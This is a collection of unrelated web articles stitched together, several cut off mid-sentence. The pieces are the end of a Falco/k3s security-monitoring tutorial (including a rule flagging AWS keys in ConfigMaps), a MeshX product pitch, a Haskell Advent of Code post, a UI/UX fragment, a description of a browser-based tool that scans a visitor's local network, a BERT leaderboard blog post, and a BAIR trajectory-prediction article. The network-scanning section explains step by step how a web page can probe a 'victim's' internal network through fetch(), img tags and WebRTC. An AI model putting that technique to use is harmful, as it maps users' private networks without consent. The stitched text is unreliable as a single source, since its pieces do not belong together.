{"kind":"Event","apiVersion":"audit.k8s.io/v1beta1","metadata":{"creationTimestamp":"2018-10-25T13:58:49Z"},"level":"Request","timestamp":"2018-10-25T13:58:49Z","auditID":"841d3e6d-90d2-43df-8da4-684738bee3d5","stage":"ResponseComplete","requestURI":"/api/v1/namespaces","verb":"create","user":{"username":"system:anonymous","groups":["system:masters","system:authenticated"]},"sourceIPs":["192.168.99.1"],"objectRef":{"resource":"namespaces","name":"foo","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":201},"requestObject":{"kind":"Namespace","apiVersion":"v1","metadata":{"name":"foo","creationTimestamp":null},"spec":{},"status":{"phase":"Active"}},"requestReceivedTimestamp":"2018-10-25T13:58:49.730588Z","stageTimestamp":"2018-10-25T13:58:49.736141Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
EOF
</code></pre>
<p>Invoke the event via Falco's REST API:</p>
<pre><code>curl http://127.0.0.1:8765/k8s-audit --data-binary @sample-event.json -H "Content-Type: application/json"
</code></pre>
<h3 id="triggeraneventfromk3s">Trigger an event from k3s</h3>
<p>An additional source we can add is the events from the Kubernetes audit log. This feature has to be turned on via the k3s systemd definition.</p>
<p>Create a folder for audit events:</p>
<pre><code>sudo mkdir -p /var/lib/rancher/audit
</code></pre>
<p>Download <code>audit-policy.yaml</code> to <code>/var/lib/rancher/audit</code></p>
<pre><code>wget https://raw.githubusercontent.com/falcosecurity/evolution/master/examples/k8s_audit_config/audit-policy.yaml
sudo cp audit-policy.yaml /var/lib/rancher/audit/
</code></pre>
<p>Create a webhook config file:</p>
<pre><code>export IP=192.168.0.23

cat &lt;&lt; EOF | sudo tee /var/lib/rancher/audit/webhook-config.yaml
apiVersion: v1
kind: Config
clusters:
- name: falco
  cluster:
    server: http://$IP:8765/k8s-audit
contexts:
- context:
    cluster: falco
    user: ""
  name: default-context
current-context: default-context
preferences: {}
users: []
EOF
</code></pre>
<p>Edit <code>/etc/systemd/system/k3s.service</code> and add these lines to the end:</p>
<pre><code>        '--kube-apiserver-arg=audit-log-path=/var/lib/rancher/audit/audit.log' \
        '--kube-apiserver-arg=audit-policy-file=/var/lib/rancher/audit/audit-policy.yaml' \
        '--kube-apiserver-arg=audit-webhook-config-file=/var/lib/rancher/audit/webhook-config.yaml' \
</code></pre>
<p>Now reload:</p>
<pre><code>sudo systemctl daemon-reload &amp;&amp; \
 sudo systemctl restart k3s
</code></pre>
<p>My favourite use-case from the docs was detecting AWS secret keys stored in ConfigMaps. Of course, we all know confidential data belongs inside Vault or Kubernetes Secrets which can be encrypted at rest.</p>
<p>Let's try it out?</p>
<p>Run this from your laptop:</p>
<pre><code>kubectl create configmap aws-creds \
  --from-literal aws_access_key_id=AKES20LNOA
</code></pre>
<p>Now check the logs from Falco:</p>
<pre><code>sudo journalctl -u falco --lines 100

Oct 13 16:55:42 ubuntu falco[89818]: 16:55:24.207932928: Warning K8s configmap with private credential (user=system:admin verb=create configmap=aws-creds-1 config={"aws_access_key_id":"AKES20LNOA"})
</code></pre>
<p>You can find this example under <a href="https://falco.org/docs/event-sources/kubernetes-audit/">"Kubernetes Audit Rules" in the Falco docs</a>.</p>
<h3 id="expandthek3scluster">Expand the k3s cluster</h3>
<p>You can add additional nodes into the k3s cluster by installing Ubuntu as we did for the first node, then running the <code>k3sup join</code> command.</p>
<pre><code>k3sup join --ip $IP -user ubuntu \
  --server-ip 192.168.0.101
</code></pre>
<p>k3s also supports High-Availability and fail-over of the master nodes using a SQL backend or an embedded version of etcd.</p>
<h2 id="wrappingup">Wrapping-up</h2>
<blockquote>
<p>Full disclosure: Sysdig is a client of <a href="https://www.openfaas.com/consulting/">OpenFaaS Ltd</a></p>
</blockquote>
<p>We now have Ubuntu 20.04.01, Kubernetes with k3s and Falco all built for 64-bit ARM running on our Raspberry Pi.</p>
<p>It's now over to you to <a href="https://falco.org/">explore Falco more</a>, and to fine-tune your Kubernetes rules.</p>
<p>I also want to give a shout out to my friend <a href="https://twitter.com/fntlnz">fntlnz</a> who is the Falco maintainer that helped me get a working build of Falco on 64-bit ARM. It took us several days to get here.</p>
<h3 id="recommendations">Recommendations</h3>
<p>It took me quite a while to figure out how to get this to work, but it was nice when everything clicked into place. So be warned, the Falco documentation still refers to "Dynamic Auditing" which was removed and deprecated in Kubernetes and the upstream instructions don't cover k3s yet, or any release newer than 1.13.</p>
<p>I hope to see the team at Sysdig spend some time updating the documentation and examples for newer Kubernetes releases and for an official 64-bit ARM binary to be made available soon.</p>
<h3 id="takingitfurther">Taking it further</h3>
<p>The easier way to get security and other insights, just like the open source Falco project is to use Sysdig's paid product. You can find a step-by-step tutorial by Dan here: <a href="https://sysdig.com/blog/k3s-sysdig-falco/">K3s + Sysdig: Deploying and securing your cluster… in less than 8 minutes!</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><div><div><p>Have you ever find yourself replacing a tool in your stack because it can't grow with your needs?
Not every app designed to scale well. Sometimes you ran into issues what one app can't solve. So you add another tool to the stack. But now your data in two different places and you have to learn a new app with a new UI. This is time-consuming and your data is scattered across apps.</p>
<h2>Introducing MeshX</h2>
<p>MeshX is a platform to build scalable tools and processes for your team. The purpose is to provide you with the building blocks and grant you full control. We think that one tool can replace the many others. How we achieve this? Let me explain.</p>
<h2>Building Blocks</h2>
<p>All of your apps that you use probably has 3 components:</p>
<ol>
<li>It needs to store your data structured somewhere.</li>
<li>A way to view and interact with the data.</li>
<li>And it has some magic ✨ rules that make it work.</li>
</ol>
<h3>1. Custom domain</h3>
<p>So you first need data. This data usually has some schema to it probably one of the following:</p>
<ol>
<li><strong>Hardcoded domain</strong>: The most common way to handle the problem. E.g. in JIRA you have your issues, bugs, backlog, ideas, releases. This design by its nature is not extendable. The developers of the app needs to support the features you need. There is no way to define domains on your own.</li>
<li><strong>Generic domain</strong>: Okay, so let's abstract away the schema into generic domains. E.g. in Wrike you have tasks, projects, folders. You can model many things this way, it's extensible. But the solution is not native. At larger scale it easily becomes out of control. This schema has hierarchical relations, which is not intuitive for some use cases.</li>
<li><strong>Domain-less</strong>: No relation, no schema for your data. Trello works this way. You have boards, lists and cards, then you can decide what you want to store. It's flexible, but don't scale well. A lot of company using Trello in early stages but later they need to swap because this type not work well with growing needs.</li>
<li><strong>Custom domain</strong>: Custom domain combine the advantages of the above solutions. It let you define your custom <strong>types</strong> and relation between them. Of course this comes with complexity. But for that you get endless scalability and extensibility.</li>
</ol>
<p>I believe that custom domain is the future. It has a lot of potential and match really well with agile companies.</p>
<p><img src="https://mesh-x.com/images/type.jpg" alt="Custom schema" title="Custom Schema"></p>
<h3>2. Unified UI</h3>
<p>Secondary you need a way to <strong>view</strong> and interact with your data. Many apps using UI components like: <em>Tables</em>, <em>Boards</em>, <em>Calendars</em>, <em>Documents</em>, <em>Graphs</em>. Similar UI patterns but differ in the use and feel. Basically need to learn the same thing again and again. Unifying these components is speed up the learning curve of new tools and save you and your team time. Imagine you can use your bug tracker using the same UI as your CRM.</p>
<p><img src="https://mesh-x.com/images/table.jpg" alt="Table View" title="Table View">
<img src="https://mesh-x.com/images/board.jpg" alt="Board View" title="Board View"></p>
<h3>3. Custom Workflows</h3>
<p>And finally the apps has some logic. The software code that make it work behind the scenes. In the past you have two choices:</p>
<ul>
<li><em>Use a prebuild tool with fixed functionality (hard to extend and it's not customized)</em></li>
<li><em>Use a custom software built for your needs (its cost a lot of money and time)</em></li>
</ul>
<p>But today there are other options, that gained more popularity in the last years. Low-code and no-code solutions.
In MeshX the rules in your apps can be defined using a low-code/no-code editor. The idea for this actually came from the game industry where visual programming tools are used for a long time. It enabled non-technical users like 3D artists and designers to create custom logic in games. That gave me the idea that it would be a great fit for agile businesses. These <strong>flows</strong> enable you to build tools that replace manual processes and automatize most of your work without need to write a single line of code.</p>
<p><img src="https://mesh-x.com/images/flow.jpg" alt="Flow Editor" title="Flow Editor"></p>
<h2>Summary</h2>
<p>So to wrap this up we have a custom domain for flexibility, unified UI for easy use and custom workflows for custom business needs. Together these blocks are the foundation for all the tools that you can use to run your business. This is the grand vision of MeshX. One tool to rule them all.</p>
<p>If you like the idea to have all of your tools and data organized and automatized, you can sign up for a beta access.
I am also happy to answer your questions in <a href="mailto://roland@mesh-x.com">email</a>.</p>
<p><em>In the next post I'm going to show you an example how to use MeshX to build a simple social media automation tool.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So it’s November, and <a href="https://adventofcode.com/">Advent of Code</a> season is in the air! It’s time for everyone’s favorite Santa-based light hearted learn-to-program-or-a-new-language holiday season programming challenge series. Every year a bunch of us gather around the fireplace, roast chestnuts, and brainstorm all of the interesting ways we can solve these cute themed puzzles every day. These puzzles are designed to accessible enough for most new programmers, but deep enough to provide entertainment for experienced ones. I’ve <a href="https://blog.jle.im/entries/tagged/advent-of-code.html">written many blog posts</a> on some of the interesting insight some of the puzzles have yielded, and I also <a href="https://github.com/mstksg/advent-of-code-2019/blob/master/reflections.md">post my reflections on as many puzzles I can</a> while solving them in Haskell. And if you’re solving things in Haskell, I also published an <a href="https://hackage.haskell.org/package/advent-of-code-api">open-sourced rate-limited API library</a> so you can fetch and submit answers from the comfort of your command line.</p>
<p>To kick off the season, I’ve decided to write about one of my favorite puzzles from Advent of Code 2019 – <a href="https://adventofcode.com/2019/day/22">Day 22: Slam Shuffle</a>. To me, it stands out because it’s a perfect example of how Haskell’s approach to mathematical abstraction nudges you into the direction of an efficient solution — in a way that other languages would obscure or make less obvious.</p>
<p>So, let’s dive in! In the end, hopefully this post can get you excited for this wonderful season, and maybe also shed some insight into what it means when we say that Haskell can help you leverage math to find good solutions to your real problems.</p>
<p>Of course, this post has spoilers for Advent of Code 2019 Day 22, if you are planning on trying to figure it out from yourself. If you haven’t tried it, I recommend you give it a shot and come back after! :D</p>
<h2 id="slam-shuffle">Slam Shuffle</h2>
<p>If you haven’t already, take some time to <a href="https://adventofcode.com/2019/day/22">read through the problem statement</a>. The basic idea is that we are given a series of operations to “shuffle” a deck of 10007 cards, such as:</p>
<pre><code>deal with increment 7
deal into new stack
deal into new stack
... etc</code></pre>
<p>After performing all of the many operations, the question then asks about the card at a given position (the 2019th card in the deck).</p>
<p>Part 2, which you might not be able to see if you haven’t submitted an answer yet for Part 1, involves the same process with a deck of 119315717514047 cards, and repeating the entire shuffling sequence 101741582076661 times. It then asks you to find the card that ends up at index 2020.</p>
<p>In this problem, it seems we have a list of “shuffles” that we want to run on a deck of cards. However, let’s think about this in a more data-driven approach: instead of thinking about successive shufflings of cards, let’s imagine the specification of a “shuffle” itself as our main data, and how we can combine shuffle operations together into new shuffle operations.</p>
<p>We are looking for “take shuffle A and shuffle B, and return a new shuffle that represents doing B, then A”. This is “shuffle composition”, or “permutation composition” (<a href="https://en.wikipedia.org/wiki/Permutation">permutation</a> being the mathematical word for “shuffling” here, basically)</p>
<p>Since we’ve identified that we want to begin implementing a way of composing/combining permutations together, we can do a bit of reading to learn that one of the most famous properties of permutation composition is that they form a “group”, which means they can be composed (associatively), have an identity, and can be inverted. This means that if you have two permutations, you can “squish” them to create a new permutation, and work with that <em>new</em> permutation.</p>
<p>I’ve talked about <a href="https://blog.jle.im/entry/alchemical-groups.html">using group theory</a> principles before in this blog to help guide us towards solutions and optimizations — the main principle is that if we express our program in terms of group operations, then we can take advantage of the large body of knowledge built up over centuries to understand, analyze, and potentially optimize our program.</p>
<p>The <em>first</em> big advantage in this situation is that we can treat our transformations <em>as data</em>, and not as functions. And that if we have two transformations, we can always create a new one (just a normal data type value) that represents the composition of the two original ones.</p>
<h2 id="now-youre-thinking-with-groups">Now You’re Thinking With Groups</h2>
<p>Knowing permutations are a group, it means that once we settle on our representation of them, <code>Perm</code>, we can write an instance of <code>Perm</code> for <code>Semigroup</code>, <code>Monoid</code>, and <code>Group</code>, abstractions in Haskell that many types are already instances of. Abstractions like <code>Semigroup</code> and <code>Monoid</code> are pretty much an everyday thing in Haskell, so this fits in quite nicely. <code>Group</code> comes from the <em><a href="https://hackage.haskell.org/package/groups">groups</a></em> package, which also provides some nice applications of group theory.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>...</span> <span>-- let's figure out the implementation later, where n is the number of cards</span></span></code></pre></div>
<p>In Haskell, we express things like “<code>Perm</code> is a Semigroup/Monoid/Group” by saying that they are instances of <em>typeclasses</em>, which (for this purpose) are like interfaces in languages like Java.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- | An instance m can be "combined" using `x &lt;&gt; y`</span></span>

<p>This means that if <code>Perm</code> is an instance of <code>Group</code> (which has superclasses <code>Semigroup</code> and <code>Monoid</code>), we can:</p>
<ul>
<li>Compose permutations using <code>x &lt;&gt; y</code>, which means “shuffle with strategy <code>y</code>, then with strategy <code>x</code>”</li>
<li>Summon an “identity permutation” where <code>x &lt;&gt; mempty == x</code> (the identity permutation, which is “leave things alone”).</li>
<li>Invert any shuffling (if we have <code>x</code>, we can reverse its effect with <code>invert x</code>)</li>
</ul>
<p>In addition, the standard libraries also give us a useful function <code>stimes</code></p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>stimes ::</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Int</span> <span>-&gt;</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>which lets us compose <code>x</code> with itself (<code>stimes 5 x == x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code>), but can do it in <em>log(n)</em> time using <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. It’s extremely efficient in a lot of circumstances (more on that later) — more so than the naive compose-it-n-times implementation. This will definitely become useful in part 2, where we have to do 101741582076661 compositions.</p>
<h2 id="our-gameplan">Our Gameplan</h2>
<p>Just <em>knowing</em> that permutations form a group naturally guides us to these abstractions — we already know what <em>interface</em> our type will have, even before we write any code. We know that no matter <em>what</em> our implementation of permutation will be, we will have <code>(&lt;&gt;)</code>, <code>stimes</code>, <code>mempty</code>, <code>invert</code> available to us to use. So, let’s do just that! We’ll use a stub data type <code>Perm</code> to represent our permutation and “pretend” we have that interface on it. We’ll write our functions first and then fill in the interface later!</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>-- | Represents a permutation of n cards</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>....</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a><span>-- | Given a permutation, find the place where a given index ends up.</span></span>
<span id="cb5-5"><a href="#cb5-5"></a><span>runPerm ::</span> <span>Perm</span> n <span>-&gt;</span> <span>Finite</span> n <span>-&gt;</span> <span>Finite</span> n</span>
<span id="cb5-6"><a href="#cb5-6"></a></span>
<span id="cb5-7"><a href="#cb5-7"></a><span>-- | Parse a string line into the permutation it represents</span></span>
<span id="cb5-8"><a href="#cb5-8"></a><span>parsePerm ::</span> <span>String</span> <span>-&gt;</span> <span>Perm</span> n</span>
<span id="cb5-9"><a href="#cb5-9"></a></span>
<span id="cb5-10"><a href="#cb5-10"></a><span>-- | Given a permutation list, find the place where 2019 ends up</span></span>
<span id="cb5-11"><a href="#cb5-11"></a><span>part1 ::</span> [<span>Perm</span> <span>10007</span>] <span>-&gt;</span> <span>Finite</span> <span>10007</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>part1 perms <span>=</span> runPerm bigPerm <span>2019</span></span>
<span id="cb5-13"><a href="#cb5-13"></a>  <span>where</span></span>
<span id="cb5-14"><a href="#cb5-14"></a>    bigPerm <span>=</span> <span>mconcat</span> perms</span></code></pre></div>
<p>(<code>mconcat perms</code> composes all of the permutations one after another: <code>mconcat [x,y,z] = x &lt;&gt; y &lt;&gt; z</code>)</p>
<p>And…that’s it! For the actual “logic” of our part 1! All we need to do is implement <code>runPerm</code> and <code>parsePerm</code>.</p>
<p>Here, I’m using <code>Finite n</code> from the great <em><a href="https://hackage.haskell.org/package/finite-typelits">finite-typelits</a></em> library, where <code>Finite 100</code> represents “an index between 0 and 99”, etc. It’s just exactly the right “shape” to represent the index of a deck of cards. <em>finite-typelits</em> wasn’t designed with group theory in mind, but it’s still a great tool here — which is a testament to how flexible these abstractions can actually be :)</p>
<p>For example, it means that for a <code>Perm 10007</code> (a permutation of 10007 cards), the type of <code>runPerm</code> is <code>Perm 10007 -&gt; Finite 10007 -&gt; Finite 10007</code>, and the type of <code>parsePerm</code> is <code>String -&gt; Perm 10007</code>.</p>
<p>We can plan out our part 2 as well:</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>-- | Given a permutation list, find the index that will end up at 2020</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>part2 ::</span> [<span>Perm</span> <span>119315717514047</span>] <span>-&gt;</span> <span>Finite</span> <span>119315717514047</span></span>
<span id="cb6-3"><a href="#cb6-3"></a>part2 perms <span>=</span> runPerm (invert biiigPerm) <span>2020</span></span>
<span id="cb6-4"><a href="#cb6-4"></a>  <span>where</span></span>
<span id="cb6-5"><a href="#cb6-5"></a>    bigPerm   <span>=</span> <span>mconcat</span> perms</span>
<span id="cb6-6"><a href="#cb6-6"></a>    biiigPerm <span>=</span> stimes <span>101741582076661</span> bigPerm</span></code></pre></div>
<p>Part 2, I think, is where the group theory really shines.</p>
<ol type="1">
<li><p>We take advantage of <code>stimes</code>, which uses <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. That means that to compute <code>stimes 8 x</code>, instead of using</p>
<pre><code>x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code></pre>
<p>it does</p>
<pre><code>let x2 = x &lt;&gt; x
    x4 = x2 &lt;&gt; x2
in  x4 &lt;&gt; x4</code></pre>
<p>essentially cutting down the number of multiplications exponentially. This means that to compute <code>stimes 101741582076661</code>, we only need to do about 47 multiplications (log base 2), and not 101741582076661.</p>
<p>This is only possible because we know that permutation composition is associative, so it doesn’t matter how we associate our parentheses. It is only “safe” to use repeated squaring if you <em>know</em> that your operation is associative. Having a semigroup abstraction <em>in the first place</em> guides us to this efficient solution — in a way that is pre-built just for us! This is made all the more powerful because <em>semigroup</em> is a ubiquitous abstraction in Haskell, so we “think about” it all the time.</p></li>
<li><p>Remember how <code>runPerm p 2019</code> gives us the index that <code>2019</code> is sent to? Well, we want something else in this case. We basically want the index that <em>will be sent to</em> <code>2020</code>. So, we want to <em>reverse the function</em>. Luckily, since our function is just a permutation, it is easy to reverse this: just <code>invert</code> the permutation!</p>
<p>The idea that we can simply invert a permutation instead of having to write a whole new permutation representation just to do “backwards indexing” is something that we are <em>guided to</em>, just by recognizing that permutations form a group.</p></li>
</ol>
<h2 id="a-first-guess-at-implementation">A first guess at implementation</h2>
<p>Now, time to do what we have been putting off and actually write our permutation representation – the definition of <code>Perm n</code>. A good <em>first guess</em> might be to write our permutation as an actual function — a function from index to index, <code>Finite n -&gt; Finite n</code>. Then, we can just use function composition as our permutation composition.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>Perm</span> (<span>Finite</span> n <span>-&gt;</span> <span>Finit…</span></span></code></pre></div></div></div>

Engineers and designers use them in their daily work. Here’s a simple guide to these terms to clarify what they really mean.</p><h2>UI &amp; UX in simple words</h2><p>Imagine that your digital product — a website or an app — is a house. The code is the foundation and frame that shape it.</p><p>In a house, the walls, rooms, doors, and windows define the User Experience (UX). Once upon a time, someone left an opening in a wall so it would be brighter in the house and so they could see anyone approaching and enter the house. Later, someone decided it was better to walk through a door, and thus the door was designed.</p><p>Then someone’s wife decided to make the house more cozy and arranged its furnishings — the User Interface (UI). The UI determines the house’s appearance and convenience for its residents.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccb886b98300f8672abfa_5cf66e2c714334807254a77f_ux.png" loading="lazy" alt=""></p><figcaption>Photo credit: Charles Deluvio</figcaption></figure><h2>UX makes the interface user-friendly</h2><p>UX design is the process of identifying and solving problems to make an interface user-friendly.

<p>
<a href="https://samy.pl/webscan">webscan</a> is a browser-based network IP scanner and local IP detector. It detects IPs bound to the user/victim by listening on an RTP data channel via WebRTC and looping back to the port across any live IPs, as well as discovering all live IP addresses on valid subnets by monitoring for immediate timeouts (TCP RST packets returned) from <a target="_new" href="https://fetch.spec.whatwg.org/">fetch()</a> calls or hidden <i>img</i> tags pointed to valid subnets/IPs. Works on mobile and desktop across all major browsers and OS's. Beta version is extensible to allow the addition of multiple techniques.
</p><p>
webscan takes advantage of the fact that non-responsive img tag sockets can be closed to prevent browser &amp; network-based rate limiting by altering the src attribute to a non-socket URI (removing from DOM ironically does not close the socket), or by using fetch()'s signal support of the <a target="_new" href="https://dom.spec.whatwg.org/#interface-abortcontroller">AbortController()</a> interface.

<pre id="content"></pre>



<p>webscan works like so</p>

<ol>
<li>webscan first iterates through a list of common gateway IP addresses</li>
<li>for each IP, use fetch() or img tag to make fake HTTP connection to http://common.gateway.ip:1337</li>
<li>if a TCP RST returns, the fetch() promise will be rejected or img tag onerror will trigger before a timeout, indicating a live IP</li>
<li>to prevent browser or network rate limiting, non-responsive fetch() sockets are closed via AbortController() signal while img-tags have the src redirected to non-socket URI, closing the socket</li>
<li>when live gateway detected, step 1-3 reran for every IP on the subnet (<i>e.g. 192.168.0.[1-255]</i>)</li>
<li>a WebRTC data channel is opened on the browser, opening a random port on the victim machine</li>
<li>for any IPs that are found alive on the subnet, a WebRTC data channel connection is made to that host</li>
<li>if the WebRTC data channel is successful, we know we just established a connection to our own local IP</li>
</ol>


<p>Tested on</p>
<ul>
  <li>Chrome 87.0.4280.47 (macOS)</li>
  <li>Edge 86.0.622.63 (Windows)</li>

<p>“BERT Ensemble – MBGA Optimization” is a new entrant to two leader-boards natural language understanding tasks on the the Allen AI Leader-boards. Without trying to sound clickbaity, I audibly gasped when I read its results.</p>



<div><p>It scored 97.6% on the ARC reasoning challenge (Easy set). The previous high score was 92.6%, i.e. it reduced by two thirds the error rate. The ARC-Easy set, despite the name, contains both the hard and easy questions from the ARC challenge task (the hard version on the other hand excludes the easy questions). In the words of Allen AI:</p><p>“The ARC dataset contains 7,787 genuine grade-school level, multiple-choice science questions, assembled to encourage research in advanced question-answering.”</p></div>



<p>In other words, it’s a standardized school science test. Here are some examples of the questions:</p>



<p id="a36d"><em>1.Which equipment will best separate a mixture of iron filings and black pepper? (1) magnet (2) filter paper (3) triplebeam balance (4) voltmeter</em></p>



<p id="9797"><em>2. Which form of energy is produced when a rubber band vibrates? (1) chemical (2) light (3) electrical (4) sound</em></p>



<p id="966a"><em>3. Because copper is a metal, it is (1) liquid at room temperature (2) nonreactive with other substances (3) a poor conductor of electricity (4) a good conductor of heat</em></p>



<p id="6d70"><em>4. Which process in an apple tree primarily results from cell division? (1) growth (2) photosynthesis (3) gas exchange (4) waste removal</em></p>



<p> While a jump of 5% might not seem enormous, what’s so important about this is that it has reduced by two thirds the number of mistakes of the previous model, suggesting a huge leap in power.</p>



<div><p>The second result is far, far more impressive still. The OpenBookQA task is:</p><p>“[A] new kind of question-answering dataset modeled after open book exams for assessing human understanding of a subject. It consists of 5,957 multiple-choice elementary-level science questions (4,957 train, 500 dev, 500 test), which probe the understanding of a small “book” of 1,326 core science facts and the application of these facts to novel situations. For training, the dataset includes a mapping from each question to the core science fact it was designed to probe. <strong>Answering OpenBookQA questions requires additional broad common knowledge, not contained in the book.</strong> The questions, by design, are answered incorrectly by both a retrieval-based algorithm and a word co-occurrence algorithm. Strong neural baselines achieve around 50% on OpenBookQA, leaving a large gap to the 92% accuracy of crowd-workers</p></div>



<p>[Bolding not in original]</p>



<p><strong>It scored 100% on the OpenBookQA task.</strong> The previous best was 87.2% and the benchmark for human level performance by crowd-sourced workers is 91.7%. This test is intended to be an ecologically valid test of the human ability to reason over existing facts and apply them in novel situations- combined with background knowledge and understanding of the world. This program did not merely meet human level it seemingly exceeded it by a lot.</p>



<p>As for the model itself, we know very little about it beyond that it is:</p>



<p>“[An] Ensemble of BERT models with multi-metric Bayesian and genetic-algorithm based optimization.” It is by one “V. Agarwal” who I suspect- but do not know- is Vidhan Agarwal of Carnegie Mellon University.</p>



<p>Assuming these scores aren’t a mistake (and we can’t rule that out) this represents progress that I, as someone who had been -admittedly amateurishly- watching these task scoreboards for years- hadn’t expected for several years. In the case of OpenBookQA, maybe even five to ten years.</p>



<p>You can check out the results here: <a href="https://leaderboard.allenai.org/">https://leaderboard.allenai.org/</a></p>



<p>I will email Agarwal about his achievement and ask him about his methodology and if there are any plans to apply his model to other tasks. Depending on what he says I might simply update this post, or if there’s anything really interesting make a new one.</p>

<p>Multi-agent interacting systems are prevalent in the world, from purely physical systems to complicated social dynamic systems. The interactions between entities / components can give rise to very complex behavior patterns at the level of both individuals and the multi-agent system as a whole. Since usually only the trajectories of individual entities are observed without any knowledge of the underlying interaction patterns, and there are usually multiple possible modalities for each agent with uncertainty, it is challenging to model their dynamics and forecast their future behaviors.</p>

<p>

</p>

<p>In many real-world applications (e.g. autonomous vehicles, mobile robots), an effective understanding of the situation and accurate trajectory prediction of interactive agents play a significant role in downstream tasks, such as decision making and planning. We introduce a generic trajectory forecasting framework (named EvolveGraph) with explicit relational structure recognition and prediction via latent interaction graphs among multiple heterogeneous, interactive agents. Considering the uncertainty of future behaviors, the model is designed to provide multi-modal prediction hypotheses. Since the underlying interactions may evolve even with abrupt changes over time, and different modalities of evolution may lead to different outcomes, we address the necessity of dynamic relational reasoning and adaptively evolving the interaction graphs.</p>

<p>
<img src="https://bair.berkeley.edu/static/blog/evolvegraph/figure2.png" width="80%">
<br>
<i>Figure 2. An illustration of a typical urban intersection scenario.</i>
</p>

<p>We use an urban intersection scenario with multiple interacting traffic participants as an illustrative example to elaborate on the major challenges of the multi-agent behavior prediction task.</p>

<ul>
  <li>
    <p>First, there may be heterogeneous agents that have distinct behavior patterns, thus using a homogeneous dynamics / behavior model may not be sufficient. For example, there are different constraints and traffic rules for vehicles and pedestrians. More specifically, vehicle trajectories are strictly constrained by road geometry and their own kinematic models; while pedestrian behaviors are much more flexible.</p>
  </li>
  <li>
    <p>Second, there may be various types of interaction patterns in a multi-agent system. For example, the inter-vehicle interaction, inter-pedestrian interaction, and vehicle-pedestrian interaction in the same scenario present very different patterns.</p>
  </li>
  <li>
    <p>Third, the interaction patterns may evolve over time as the situation changes. For example, when a vehicle is going straight, it only needs to consider the behavior of the leading vehicle; however, when the vehicle plans to change lanes, the vehicles in the target lane are also necessary to be taken into account, which leads to a change in the interaction patterns.</p>
  </li>
  <li>
    <p>Last but not least, there may be uncertainties and multi-modalities in the future behaviors of each agent, which leads to various outcomes. For example, in an intersection, the vehicle may either go straight or take a turn.</p>
  </li>
</ul>

<p>In this work, we took a step forward to handle these challenges and provided a generic framework for trajectory prediction with dynamic relational reasoning for multi-agent systems. More specifically, we address the problem of</p>

<ul>
  <li>extracting the underlying interaction patterns with a latent graph structure, which is able to handle different types of agents in a unified way,</li>
  <li>capturing the dynamics of interaction graph evolution for dynamic relational reasoning,</li>
  <li>predicting future trajectories (state sequences) based on the historical observations and the latent interaction graph, and</li>
  <li>capturing the uncertainty and multi-modality of future system behaviors.</li>
</ul>

<p>
<img src="https://bair.berkeley.edu/static/blog/evolvegraph/figure3.png" width="60%">
<br>
<i>Figure 3. An illustration of the observation graph and interaction graph.</i>
</p>

<p>The multi-agent interacting system is naturally represented by a graph, where agents are considered as nodes and their relations are considered as edges. We have two types of graphs for different purposes, which are introduced below:</p>
<ul>
  <li><strong>Observation Graph</strong>: The observation graph aims to extract feature embeddings from raw observations, which consists of N agent nodes and one context node. Agent nodes are bidirectionally connected to each other, and the context node only has outgoing edges to each agent node. Each agent node has two types of attributes: self-attribute and social-attribute. The former only contains the node’s own state information, while the latter only contains other nodes’ state information.</li>
  <li><strong>Interaction Graph</strong>: We use different edge types to represent distinct interaction patterns. No edge between a pair of nodes means that the two nodes have no relation. The interaction graph represents interaction patterns with a distribution of edge types for each edge, which is built on top of the observation graph.</li>
</ul>

<p>

<br>
<i>Figure 4. A high-level graphical illustration of EvolveGraph.</i>
</p>

<h3 id="dynamic-interaction-graph-learning">Dynamic Interaction Graph Learning</h3>

<p>In many situations, the interaction patterns recognized from the past time steps are likely not static in the future. Moreover, many interaction systems have multi-modal properties in nature. Different modalities afterwards are likely to result in different interaction patterns and outcomes. Therefore, we designed a dynamic evolving process of the interaction patterns.</p>

<p>As illustrated in Figure 4, the encoding process is repeated every τ (re-encoding gap) time steps to obtain the latent interaction graph based on the latest observation graph. A recurrent unit (GRU) is utilized to maintain and propagate the history information, as well as to adjust the prior interaction graphs. More details can be found in <a href="https://papers.nips.cc/paper/2020/hash/e4d8163c7a068b65a64c89bd745ec360-Abstract.html">our paper</a>.</p>

<h3 id="uncertainty-and-multi-modality">Uncertainty and Multi-Modality</h3>
<p>Here we emphasize the efforts to encourage diverse and multi-modal trajectory prediction and generation. In our framework, the uncertainty and multi-modality mainly come from three aspects:</p>
<ul>
  <li>First, in the decoding process, we output Gaussian mixture distributions indicating that there are several possible modalities at the next step. We only sample a single Gaussian component at each step based on the component weights which indicate the probability of each modality.</li>
  <li>Second, different sampled trajectories will lead to different interaction graph evolution. Evolution of interaction graphs contributes to the multi-modality of future behaviors, since different underlying relational structures enforce different regulations on the system behavior and lead to various outcomes.</li>
